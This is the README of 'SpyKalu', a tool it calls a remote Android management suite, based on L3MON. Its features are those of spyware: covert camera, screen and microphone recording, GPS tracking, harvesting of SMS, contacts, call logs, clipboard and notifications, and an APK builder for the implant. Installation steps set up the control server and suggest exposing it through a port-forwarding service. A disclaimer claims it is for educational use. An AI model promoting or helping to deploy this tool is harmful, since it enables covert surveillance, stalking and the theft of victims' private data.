# SpyKalu
<p align="center">
<img src="https://github.com/kaluramkhorwal3/SpyKalu/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>



## Features
- Screenshot Capture
- Screen Recorder
- Rear Camera Recorder
- Front Camera Recorder
- Lock Device
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder


## Installation
### For TermuxBlack Users
- `apt install spykalu`
- Run server `spykalu`

### For Termux Users
1. Install NodeJs `apt install nodejs`

2. Clone `git clone https://github.com/kaluramkhorwal3/SpyKalu.git`

3. Goto server directory `cd SpyKalu/server`

4. Install all dependencies `npm install`

5. Make a separate directory where spykalu app will be save `mkdir ~/spykalu`

6. Run server `node index.js`

7. In your browser navigate to `http://<SERVER IP>:22533` & Login with default username and password ( By default server will run on localhost and to make a client APP you can use [PORTMAP](https://portmap.io) to access APP on wide area network , check below for demo to setup SpyKalu with PORTMAP.)


## Thanks
 - Inspiration for the project and the basic building blocks for the Android App are based off [L3MON](https://github.com/D3VL/L3MON) 
 

## Disclaimer
<b>I  kaluramkhorwal3   Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
SpyKalu is built for both Educational and Internal use ONLY.</b>
